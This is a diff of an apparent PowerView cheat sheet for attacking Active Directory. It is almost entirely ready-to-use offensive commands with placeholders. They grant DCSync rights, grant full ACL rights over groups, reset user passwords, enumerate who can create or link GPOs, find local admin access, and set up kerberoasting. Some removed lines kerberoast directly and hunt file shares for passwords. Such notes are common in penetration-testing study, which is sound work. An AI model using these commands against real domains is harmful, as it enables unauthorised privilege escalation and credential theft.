@@ -4,26 +4,14 @@ https://raw.githubusercontent.com/AdrianVollmer/PowerSploit/master/Recon/PowerVi
 # get domain controller for current domain
 Get-NetDomainController
 
-# kerberoast
-Invoke-Kerberoast -OutputFormat [hashcat|john]> | % { $_.Hash } | Out-File -Encoding utf8 <file>
-
 # get remote logged in user
 Get-NetSession -ComputerName <fqdnRhost>
-
-# get all users that can read the LAPS password of a specific host
-Get-NetComputer -ComputerName '<fqdnRhost>' -FullData | Select-Object -ExpandProperty distinguishedname | ForEach-Object { $_.substring($_.indexof('OU')) } | ForEach-Object { Get-ObjectAcl -ResolveGUIDs -DistinguishedName $_ } | Where-Object { ($_.ObjectType -like 'ms-Mcs-AdmPwd') -and ($_.ActiveDirectoryRights -match 'ReadProperty')} | ForEach-Object {Convert-NameToSid $_.IdentityReference} | Select-Object -ExpandProperty SID | Get-ADObject
 
 # get object descriptions
 Get-NetUser | select-object samaccountname,description | fl | Out-File <file>.txt
 
 # get specific user description
 Get-NetUser -Username <user> 
-
-# get list of computers
-Get-NetComputer -FullData
-
-# find interesting files on readable share
-Invoke-FileFinder -IncludeC -IncludeAdmin -Terms pass,admin,secret,tomcat,login -OfficeDocs -Verbose -OutFile filefinder.csv
 
 # get list of all domain trusts
 Get-NetDomainTrust
@@ -34,17 +22,26 @@ Get-NetForest
 # find all machines where user has local admin rights
 Find-LocalAdminAccess –Verbose
 
+# show all security identifiers (SID) that can create new GPOs
+Get-DomainObjectAcl -SearchBase "CN=Policies,CN=System,DC=<domain>,DC=<domain>" -ResolveGUIDs | ? { $_.ObjectAceType -eq "Group-Policy-Container" } | select ObjectDN, ActiveDirectoryRights, SecurityIdentifier | fl
+
+# get name of SID
+ConvertFrom-SID <securityIdentifier>
+
+# show all principals that can write to GP-Link attributes
+Get-DomainOU | Get-DomainObjectAcl -ResolveGUIDs | ? { $_.ObjectAceType -eq "GP-Link" -and $_.ActiveDirectoryRights -match "WriteProperty" } | select ObjectDN, SecurityIdentifier | fl
+
+# get computeraccounts in specific OU
+Get-DomainComputer | ? { $_.DistinguishedName -match "<distinguishedName>" -or $_.DistinguishedName -match "OU=5735" } | select DnsHostName
+
 # add full permissions over a group to specific user (right = All or ResetPassword or WriteMembers)
-Add-ObjectAcl -TargetADSprefix 'CN=<group>,CN=System' -PrincipalSamAccountName <user> -Rights <right> -Verbose
+Add-ObjectAcl -TargetADSprefix '<distinguishedName>' -PrincipalSamAccountName <user> -Rights <right> -Verbose
 
 # add DCSync right to a specific user
-Add-ObjectAcl -TargetDistinguishedName 'DC=<domainController>,DC=local' -PrincipalSamAccountName <user> -Rights DCSync -Verbose
+Add-ObjectAcl -TargetDistinguishedName 'distinguishedName' -PrincipalSamAccountName <user> -Rights DCSync -Verbose
 
 # set a new password for specific user
 Set-DomainUserPassword -Identity <user> -AccountPassword (ConvertTo-SecureString "<password>" -AsPlainText -Force) -Verbose
-
-# add user to a group
-Add-DomainGroupMember -Identity '<group>' -Members <user> -Verbose
 
 # check if user has SPN set (targeted kerberoast)
 Get-DomainUser -Identity <userOrComputer> | select serviceprincipalname
